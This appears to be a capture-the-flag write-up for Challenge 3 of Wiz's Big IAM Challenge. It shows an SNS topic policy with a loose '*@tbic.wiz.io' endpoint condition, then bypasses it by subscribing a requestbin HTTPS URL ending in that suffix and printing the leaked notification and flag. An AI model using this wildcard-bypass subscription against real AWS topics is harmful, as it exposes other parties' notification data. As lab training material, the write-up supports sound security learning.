# Challenge 3

**Challenge 3:** https://bigiamchallenge.com/challenge/3

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/f6eeae81-e16d-4eef-9b81-efe28552ffa7)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/54ec8c68-a9ca-4c0c-ade5-9f48fc427390)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/ccaee9d9-ba02-4c4b-98c7-180e87db9185)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/b3123301-b3d8-4ef2-927a-513adef70f7d)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/4e9f8d5b-807c-46af-99eb-0eefaea976fb)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/bd6c9656-9d6b-4ebe-a952-4037404b1971)

```
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

```
aws sns subscribe --topic-arn "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications" --protocol https --notification-endpoint https://eo3cger2lfp4pnh.m.pipedream.net/@tbic.wiz.io
{
    "SubscriptionArn": "pending confirmation"
}
```

Use https://pipedream.com/requestbin

```
{
  "event": {
    "method": "POST",
    "path": "/@tbic.wiz.io",
    "query": {},
    "client_ip": "72.21.217.142",
    "url": "https://eo3cger2lfp4pnh.m.pipedream.net/@tbic.wiz.io",
    "headers": {
      "host": "eo3cger2lfp4pnh.m.pipedream.net",
      "x-amzn-trace-id": "Root=1-665ce0a0-17e9424a0360c75704188102;Parent=3772c3f65797a758;Sampled=0;Lineage=36680206:0",
      "content-length": "963",
      "x-amz-sns-message-type": "Notification",
      "x-amz-sns-message-id": "362d4642-8a4f-5772-8d04-189468afc901",
      "x-amz-sns-topic-arn": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
      "x-amz-sns-subscription-arn": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:e79e6f9e-57d1-428b-8b46-c165c42cbb6f",
      "content-type": "text/plain; charset=UTF-8",
      "user-agent": "Amazon Simple Notification Service Agent",
      "accept-encoding": "gzip,deflate"
    },
    "body": {
      "Type": "Notification",
      "MessageId": "362d4642-8a4f-5772-8d04-189468afc901",
      "TopicArn": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
      "Message": "{wiz:always-suspect-asterisks}",
      "Timestamp": "2024-06-02T21:14:08.547Z",
      "SignatureVersion": "1",
      "Signature": "ULouJsa9ad6igZIwBaE5Xh/iDVFVOuZ6BUmEaqnlu9NsQpu5/JuDJ1OWuEd8vrFukz83NHFQmQX0csPORa51dCj9aGLwNHalosgDG3aFfkkTsaWD53kCEKeWiMxp6TxtmKQJa2WqWtTCh74cd3X98weo05qNbH1cUh23w9mbnhmlm4kS0K1rUFOWCnFMh05l78yFOyLgihnQ5Toyp5Y/D0SXEn4/8XbXKght9WF3fcLuoV06CKOaOcqhEOUFHB99IsNlCLGyGO9deDcGGXzRqgUph1OfXvTk+HdtGPqFFt4z7Nbwn2vm7F/nFiEQ+EYKA+70Jj+dq/mLk4VvcZhHJg==",
      "SigningCertURL": "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-60eadc530605d63b8e62a523676ef735.pem",
      "UnsubscribeURL": "https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:e79e6f9e-57d1-428b-8b46-c165c42cbb6f"
    }
  },
  "context": {
    "id": "2hLABTcXapAu8qfEUjs5sVkUFmg",
    "ts": "2024-06-02T21:14:08.649Z",
    "pipeline_id": null,
    "workflow_id": "p_BjCaLL8",
    "deployment_id": "d_dlsdrnRe",
    "source_type": "COMPONENT",
    "verified": false,
    "hops": null,
    "test": false,
    "replay": false,
    "owner_id": "o_9WIm0bJ",
    "platform_version": "3.49.1",
    "workflow_name": "RequestBin",
    "resume": null,
    "emitter_id": "hi_G7HQXbD",
    "trace_id": "2hLABWBu6tqz7rXdKS9vlkJkHjW"
  }
}
```

